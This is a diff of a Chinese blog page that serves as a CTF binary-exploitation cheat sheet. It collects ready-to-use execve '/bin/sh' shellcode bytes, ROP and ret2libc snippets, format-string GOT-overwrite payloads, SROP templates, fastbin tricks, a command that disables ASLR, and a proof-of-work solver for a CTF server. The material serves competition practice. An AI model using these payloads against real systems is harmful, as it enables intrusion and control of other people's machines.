@@ -5,9 +5,10 @@
 <head>
     <meta charset="utf-8">
     <meta name="keywords" content="pwn, 1amfree">
-    <meta name="description" content="pwnpwn更换目标libc123patchelf --replace-needed libc.so.6 你要换的libc的硬路径 ./pwnpatchelf --set-interpreter ld的硬路径 ./pwn
+    <meta name="description" content="pwnpwn更换目标libcpatchelf --replace-needed libc.so.6 你要换的libc的硬路径 .&amp;#x2F;pwn
 
-标题指定1234">
+patchelf --set-interpreter ld的硬路径 .&amp;#x2F;pwn
+">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -396,7 +397,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    1k
+                    1.2k
                 </div>
                 
 
@@ -418,6 +419,9 @@
         <hr class="clearfix">
 
         
+        <!-- 是否加载使用自带的 prismjs. -->
+        <link rel="stylesheet" href="/libs/prism/prism.css">
+        
 
         
         <!-- 代码块折行 -->
@@ -428,31 +432,145 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="pwn更换目标libc"><a href="#pwn更换目标libc" class="headerlink" title="pwn更换目标libc"></a>pwn更换目标libc</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">patchelf --replace-needed libc.so.6 你要换的libc的硬路径 ./pwn</span><br><span class="line"></span><br><span class="line">patchelf --set-interpreter ld的硬路径 ./pwn</span><br></pre></td></tr></table></figure>
+                <h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="pwn更换目标libc"><a href="#pwn更换目标libc" class="headerlink" title="pwn更换目标libc"></a>pwn更换目标libc</h2><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">patchelf --replace-needed libc.so.6 你要换的libc的硬路径 .&#x2F;pwn
 
-<h2 id="标题指定"><a href="#标题指定" class="headerlink" title="标题指定"></a>标题指定</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">context(arch=<span class="string">&quot;i386&quot;</span>,os=<span class="string">&quot;linux&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>,<span class="string">&#x27;-x&#x27;</span>,<span class="string">&#x27;sh&#x27;</span>,<span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,os=<span class="string">&quot;linux&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>,<span class="string">&#x27;-x&#x27;</span>,<span class="string">&#x27;sh&#x27;</span>,<span class="string">&#x27;-c&#x27;</span>]</span><br></pre></td></tr></table></figure>
+patchelf --set-interpreter ld的硬路径 .&#x2F;pwn<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
-<h2 id="ROPgedget"><a href="#ROPgedget" class="headerlink" title="ROPgedget"></a>ROPgedget</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary rop --only &#x27;pop|ret&#x27; | grep &#x27;eax&#x27;</span><br><span class="line">查找可存储寄存器的代码</span><br><span class="line"> ROPgadget --binary rop --string &quot;/bin/sh&quot;</span><br><span class="line">查找字符串</span><br><span class="line">ROPgadget --binary rop  --only &#x27;int&#x27;</span><br><span class="line">查找有int 0x80的地址</span><br><span class="line"></span><br><span class="line">写rop也可以用ROPgadget</span><br><span class="line">ROPgadget --binary ./rop --ropchain</span><br><span class="line">from struct import pack</span><br></pre></td></tr></table></figure>
+<h2 id="标题指定"><a href="#标题指定" class="headerlink" title="标题指定"></a>标题指定</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python">context(arch&#x3D;&quot;i386&quot;,os&#x3D;&quot;linux&quot;,log_level&#x3D;&quot;debug&quot;)
+context.terminal &#x3D; [&#39;gnome-terminal&#39;,&#39;-x&#39;,&#39;sh&#39;,&#39;-c&#39;]
 
-<h2 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">libc_write=libc.symbols[<span class="string">&quot;write&quot;</span>]</span><br><span class="line">system_addr=base_addr+libc.symbols[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">bin_sh=base_addr+libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>).__next__()</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>)</span><br></pre></td></tr></table></figure>
+context(arch&#x3D;&quot;amd64&quot;,os&#x3D;&quot;linux&quot;,log_level&#x3D;&quot;debug&quot;)
+context.terminal &#x3D; [&#39;gnome-terminal&#39;,&#39;-x&#39;,&#39;sh&#39;,&#39;-c&#39;]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<h2 id="关闭ASLR"><a href="#关闭ASLR" class="headerlink" title="关闭ASLR"></a>关闭ASLR</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo sh -c &quot;echo 0 &gt; /proc/sys/kernel/randomize_va_space&quot;</span><br><span class="line">即可关闭ASLR</span><br><span class="line">sudo sh -c &quot;echo 2 &gt; /proc/sys/kernel/randomize_va_space&quot; </span><br><span class="line">开启ASLR</span><br></pre></td></tr></table></figure>
+<h2 id="ROPgedget"><a href="#ROPgedget" class="headerlink" title="ROPgedget"></a>ROPgedget</h2><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">ROPgadget --binary rop --only &#39;pop|ret&#39; | grep &#39;eax&#39;
+查找可存储寄存器的代码
+ ROPgadget --binary rop --string &quot;&#x2F;bin&#x2F;sh&quot;
+查找字符串
+ROPgadget --binary rop  --only &#39;int&#39;
+查找有int 0x80的地址
 
-<h2 id="格式化字符串漏洞"><a href="#格式化字符串漏洞" class="headerlink" title="格式化字符串漏洞"></a>格式化字符串漏洞</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">任意地址写</span><br><span class="line">直接使用pwntools的fmtstr_payload函数</span><br><span class="line">如：需要在<span class="number">0xffffdafc</span>该地址上写入数据<span class="number">0x5201314</span></span><br><span class="line">fmtstr_payload(<span class="number">7</span>,&#123;<span class="number">0xffffdafc</span>:<span class="number">0x5201314</span>&#125;)</span><br><span class="line">前提是需要先确定好字符串的偏移量，这上面为<span class="number">7</span></span><br><span class="line"></span><br><span class="line">fmtstr_payload(offset, writes, numbwritten=<span class="number">0</span>, write_size=<span class="string">&#x27;byte&#x27;</span>)</span><br><span class="line">第一个参数表示格式化字符串的偏移；</span><br><span class="line">第二个参数表示需要利用%n写入的数据，采用字典形式，我们要将printf的GOT数据改为system函数地址，就写成&#123;printfGOT: systemAddress&#125;；本题是将0804a048处改为<span class="number">0x2223322</span></span><br><span class="line">第三个参数表示已经输出的字符个数，这里没有，为<span class="number">0</span>，采用默认值即可；</span><br><span class="line">第四个参数表示写入方式，是按字节（byte）、按双字节（short）还是按四字节（<span class="built_in">int</span>），对应着hhn、hn和n，默认值是byte，即按hhn写。</span><br><span class="line">fmtstr_payload函数返回的就是payload</span><br><span class="line"></span><br><span class="line">格式化字符串偏移量查找：</span><br><span class="line">fmtarg <span class="number">0xffffff</span></span><br><span class="line"></span><br><span class="line">修改多个地址的值：</span><br><span class="line">payload=fmtstr_payload(<span class="number">6</span>,&#123;atoi_got:system_plt+<span class="number">6</span>,system_got:main&#125;)</span><br></pre></td></tr></table></figure>
+写rop也可以用ROPgadget
+ROPgadget --binary .&#x2F;rop --ropchain
+from struct import pack<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<h2 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">pwntools生成64位shellcode语句：</span><br><span class="line">shellcode=asm(shellcraft.amd64.sh(),arch=&#x27;amd64&#x27;)</span><br><span class="line">shellcode=asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line">32位shellcode：</span><br><span class="line">&#x27;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80&#x27;</span><br><span class="line"></span><br><span class="line">64位shellcode：</span><br><span class="line">&#x27;\x48\x31\xc0\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\x48\x31\xd2\x48\x31\xf6\xb0\x3b\x0f\x05&#x27;</span><br><span class="line"></span><br><span class="line">&quot;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05&quot;</span><br><span class="line"></span><br><span class="line">shellcrft生成orw的shellcode：</span><br><span class="line">code = shellcraft.open(&quot;/flag&quot;)</span><br><span class="line">code += shellcraft.read(3,target_addr,0x50)</span><br><span class="line">code += shellcraft.write(1, target_addr, 0x50)</span><br><span class="line">shellcode=asm(code)</span><br></pre></td></tr></table></figure>
+<h2 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python">libc_write&#x3D;libc.symbols[&quot;write&quot;]
+system_addr&#x3D;base_addr+libc.symbols[&quot;system&quot;]
+bin_sh&#x3D;base_addr+libc.search(b&#39;&#x2F;bin&#x2F;sh&#39;).__next__()
 
-<h2 id="SROP模板"><a href="#SROP模板" class="headerlink" title="SROP模板"></a>SROP模板</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">sigframe = SigreturnFrame()</span><br><span class="line">sigframe.rax = constants.SYS_execve</span><br><span class="line">sigframe.rdi = stack_addr + <span class="number">0x120</span>  <span class="comment"># &quot;/bin/sh&quot; &#x27;s addr</span></span><br><span class="line">sigframe.rsi = <span class="number">0x0</span></span><br><span class="line">sigframe.rdx = <span class="number">0x0</span></span><br><span class="line">sigframe.rsp = stack_addr</span><br><span class="line">sigframe.rip = syscall_ret</span><br><span class="line"></span><br><span class="line">read = SigreturnFrame()</span><br><span class="line">read.rax = constants.SYS_read</span><br><span class="line">read.rdi = <span class="number">0</span></span><br><span class="line">read.rsi = stack_addr</span><br><span class="line">read.rdx = <span class="number">0x400</span></span><br><span class="line">read.rsp = stack_addr</span><br><span class="line">read.rip = syscall_ret</span><br></pre></td></tr></table></figure>
+r.recvuntil(b&quot;\x7f&quot;)[-6:].ljust(8,b&quot;\x00&quot;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<h2 id="整数溢出"><a href="#整数溢出" class="headerlink" title="整数溢出"></a>整数溢出</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">int绕过判断条件，输入2147483648，返回0x80000000</span><br><span class="line"></span><br><span class="line">http://www.binaryconvert.com/convert_double.html</span><br><span class="line">可用于查询小数的值</span><br></pre></td></tr></table></figure>
+<h2 id="关闭ASLR"><a href="#关闭ASLR" class="headerlink" title="关闭ASLR"></a>关闭ASLR</h2><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">sudo sh -c &quot;echo 0 &gt; &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;randomize_va_space&quot;
+即可关闭ASLR
+sudo sh -c &quot;echo 2 &gt; &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;randomize_va_space&quot; 
+开启ASLR<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 
-<h2 id="seccomp-tools"><a href="#seccomp-tools" class="headerlink" title="seccomp-tools"></a>seccomp-tools</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">seccomp-tools dump ./file</span><br><span class="line">分析程序的seccomp状态，哪些被系统被禁用了安装</span><br></pre></td></tr></table></figure>
+<h2 id="格式化字符串漏洞"><a href="#格式化字符串漏洞" class="headerlink" title="格式化字符串漏洞"></a>格式化字符串漏洞</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python">任意地址写
+直接使用pwntools的fmtstr_payload函数
+如：需要在0xffffdafc该地址上写入数据0x5201314
+fmtstr_payload(7,&#123;0xffffdafc:0x5201314&#125;)
+前提是需要先确定好字符串的偏移量，这上面为7
 
-<h2 id="多线程查看"><a href="#多线程查看" class="headerlink" title="多线程查看"></a>多线程查看</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb 中使用 &#x27;fsbase&#x27; 指令即可获得 fs 寄存器的值，&#x27;info threads&#x27; 可以查看当前的线程，&#x27;thread i&#x27; 可以切换到第 i 个线程</span><br></pre></td></tr></table></figure>
+fmtstr_payload(offset, writes, numbwritten&#x3D;0, write_size&#x3D;&#39;byte&#39;)
+第一个参数表示格式化字符串的偏移；
+第二个参数表示需要利用%n写入的数据，采用字典形式，我们要将printf的GOT数据改为system函数地址，就写成&#123;printfGOT: systemAddress&#125;；本题是将0804a048处改为0x2223322
+第三个参数表示已经输出的字符个数，这里没有，为0，采用默认值即可；
+第四个参数表示写入方式，是按字节（byte）、按双字节（short）还是按四字节（int），对应着hhn、hn和n，默认值是byte，即按hhn写。
+fmtstr_payload函数返回的就是payload
 
-<h2 id="Sha256爆破-proof-of-work"><a href="#Sha256爆破-proof-of-work" class="headerlink" title="Sha256爆破 proof of work"></a>Sha256爆破 proof of work</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> codecs</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> remote, context</span><br><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> urandom</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"><span class="comment">#r=process(&quot;/home/ubuntu/pwn/比赛/hgame/oldfashion_note/note&quot;)</span></span><br><span class="line">r=remote(<span class="string">&quot;chuj.top&quot;</span>,<span class="number">51513</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">PoW</span>(<span class="params">hash_value, part</span>):</span><br><span class="line">    alphabet = string.ascii_letters + string.digits</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> itertools.product(alphabet, repeat=<span class="number">4</span>):</span><br><span class="line">        nonce = <span class="string">&#x27;&#x27;</span>.join(x)</span><br><span class="line">        <span class="keyword">if</span> sha256((nonce + part).encode()).hexdigest() == hash_value:</span><br><span class="line">            <span class="keyword">return</span> nonce</span><br><span class="line">elf=ELF(<span class="string">&quot;/home/ubuntu/pwn/比赛/hgame/oldfashion_note/note&quot;</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;/home/ubuntu/pwn/比赛/hgame/oldfashion_note/libc-2.31.so&quot;</span>)</span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,os=<span class="string">&quot;linux&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>,<span class="string">&#x27;-x&#x27;</span>,<span class="string">&#x27;sh&#x27;</span>,<span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&quot;===\n&quot;</span>)</span><br><span class="line">line = r.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(line)</span><br><span class="line">re_res = re.search(<span class="string">r&#x27;\) == ([0-9a-z]&#123;64&#125;)&#x27;</span>, line.decode())</span><br><span class="line"><span class="built_in">print</span>(re_res)</span><br><span class="line"><span class="comment"># part = re_res.group(1)</span></span><br><span class="line"><span class="comment"># print(part)</span></span><br><span class="line">hash_value = re_res.group(<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(hash_value)</span><br><span class="line">nonce = PoW(hash_value, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(nonce)</span><br><span class="line">r.sendline(nonce.encode())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;PoW finish.&#x27;</span>)</span><br></pre></td></tr></table></figure>
+格式化字符串偏移量查找：
+fmtarg 0xffffff
 
-<h2 id="find-fake-fast"><a href="#find-fake-fast" class="headerlink" title="find_fake_fast"></a>find_fake_fast</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Fastbin attack在申请堆块时会对chunk的size域进行检查，因此在申请时，需要对size域的检查进行绕过。</span><br><span class="line">将堆块申请到malloc_hook附近，从而修改malloc_hook的内容，可以使用pwndbg自带的命令：</span><br><span class="line">find_fake_fast 0x7ffff7dd1b10 0x70</span><br><span class="line">0x7ffff7dd1b10为main_arena的地址或想要修改的内容</span><br><span class="line">0x70为想要申请的fake_chunk的size，一般为0x70</span><br><span class="line">Print (viod *)&amp;main_arena为打印main_arena的地址</span><br><span class="line">Print (void *)&amp;__malloc_hook</span><br></pre></td></tr></table></figure>
+修改多个地址的值：
+payload&#x3D;fmtstr_payload(6,&#123;atoi_got:system_plt+6,system_got:main&#125;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h2><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">pwntools生成64位shellcode语句：
+shellcode&#x3D;asm(shellcraft.amd64.sh(),arch&#x3D;&#39;amd64&#39;)
+shellcode&#x3D;asm(shellcraft.sh())
+
+32位shellcode：
+&#39;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80&#39;
+
+64位shellcode：
+&#39;\x48\x31\xc0\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\x48\x31\xd2\x48\x31\xf6\xb0\x3b\x0f\x05&#39;
+
+&quot;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05&quot;
+
+shellcrft生成orw的shellcode：
+code &#x3D; shellcraft.open(&quot;&#x2F;flag&quot;)
+code +&#x3D; shellcraft.read(3,target_addr,0x50)
+code +&#x3D; shellcraft.write(1, target_addr, 0x50)
+shellcode&#x3D;asm(code)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="SROP模板"><a href="#SROP模板" class="headerlink" title="SROP模板"></a>SROP模板</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python">sigframe &#x3D; SigreturnFrame()
+sigframe.rax &#x3D; constants.SYS_execve
+sigframe.rdi &#x3D; stack_addr + 0x120  # &quot;&#x2F;bin&#x2F;sh&quot; &#39;s addr
+sigframe.rsi &#x3D; 0x0
+sigframe.rdx &#x3D; 0x0
+sigframe.rsp &#x3D; stack_addr
+sigframe.rip &#x3D; syscall_ret
+
+read &#x3D; SigreturnFrame()
+read.rax &#x3D; constants.SYS_read
+read.rdi &#x3D; 0
+read.rsi &#x3D; stack_addr
+read.rdx &#x3D; 0x400
+read.rsp &#x3D; stack_addr
+read.rip &#x3D; syscall_ret<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="整数溢出"><a href="#整数溢出" class="headerlink" title="整数溢出"></a>整数溢出</h2><pre class="line-numbers language-none"><code class="language-none">int绕过判断条件，输入2147483648，返回0x80000000
+
+http:&#x2F;&#x2F;www.binaryconvert.com&#x2F;convert_double.html
+可用于查询小数的值<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="seccomp-tools"><a href="#seccomp-tools" class="headerlink" title="seccomp-tools"></a>seccomp-tools</h2><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">seccomp-tools dump .&#x2F;file
+分析程序的seccomp状态，哪些被系统被禁用了安装<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<h2 id="多线程查看"><a href="#多线程查看" class="headerlink" title="多线程查看"></a>多线程查看</h2><pre class="line-numbers language-none"><code class="language-none">gdb 中使用 &#39;fsbase&#39; 指令即可获得 fs 寄存器的值，&#39;info threads&#39; 可以查看当前的线程，&#39;thread i&#39; 可以切换到第 i 个线程<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h2 id="Sha256爆破-proof-of-work"><a href="#Sha256爆破-proof-of-work" class="headerlink" title="Sha256爆破 proof of work"></a>Sha256爆破 proof of work</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *
+import re
+import itertools
+import string
+import codecs
+from hashlib import sha256
+from pwn import remote, context
+from os import urandom
+import itertools
+import datetime
+#r&#x3D;process(&quot;&#x2F;home&#x2F;ubuntu&#x2F;pwn&#x2F;比赛&#x2F;hgame&#x2F;oldfashion_note&#x2F;note&quot;)
+r&#x3D;remote(&quot;chuj.top&quot;,51513)
+def PoW(hash_value, part):
+    alphabet &#x3D; string.ascii_letters + string.digits
+    for x in itertools.product(alphabet, repeat&#x3D;4):
+        nonce &#x3D; &#39;&#39;.join(x)
+        if sha256((nonce + part).encode()).hexdigest() &#x3D;&#x3D; hash_value:
+            return nonce
+elf&#x3D;ELF(&quot;&#x2F;home&#x2F;ubuntu&#x2F;pwn&#x2F;比赛&#x2F;hgame&#x2F;oldfashion_note&#x2F;note&quot;)
+libc&#x3D;ELF(&quot;&#x2F;home&#x2F;ubuntu&#x2F;pwn&#x2F;比赛&#x2F;hgame&#x2F;oldfashion_note&#x2F;libc-2.31.so&quot;)
+context(arch&#x3D;&quot;amd64&quot;,os&#x3D;&quot;linux&quot;,log_level&#x3D;&quot;debug&quot;)
+context.terminal &#x3D; [&#39;gnome-terminal&#39;,&#39;-x&#39;,&#39;sh&#39;,&#39;-c&#39;]
+
+r.recvuntil(&quot;&#x3D;&#x3D;&#x3D;\n&quot;)
+line &#x3D; r.recvuntil(b&#39;\n&#39;)
+print(line)
+re_res &#x3D; re.search(r&#39;\) &#x3D;&#x3D; ([0-9a-z]&#123;64&#125;)&#39;, line.decode())
+print(re_res)
+# part &#x3D; re_res.group(1)
+# print(part)
+hash_value &#x3D; re_res.group(1)
+print(hash_value)
+nonce &#x3D; PoW(hash_value, &#39;&#39;)
+print(nonce)
+r.sendline(nonce.encode())
+print(&#39;PoW finish.&#39;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="find-fake-fast"><a href="#find-fake-fast" class="headerlink" title="find_fake_fast"></a>find_fake_fast</h2><pre class="line-numbers language-none"><code class="language-none">Fastbin attack在申请堆块时会对chunk的size域进行检查，因此在申请时，需要对size域的检查进行绕过。
+将堆块申请到malloc_hook附近，从而修改malloc_hook的内容，可以使用pwndbg自带的命令：
+find_fake_fast 0x7ffff7dd1b10 0x70
+0x7ffff7dd1b10为main_arena的地址或想要修改的内容
+0x70为想要申请的fake_chunk的size，一般为0x70
+Print (viod *)&amp;main_arena为打印main_arena的地址
+Print (void *)&amp;__malloc_hook<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p><img src="E:\笔记\笔记图片\find_fake_fast.png"></p>
 
@@ -814,7 +932,7 @@
             <br>
             
                 &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                        class="white-color">1.3k</span>
+                        class="white-color">1.5k</span>
             
             
             
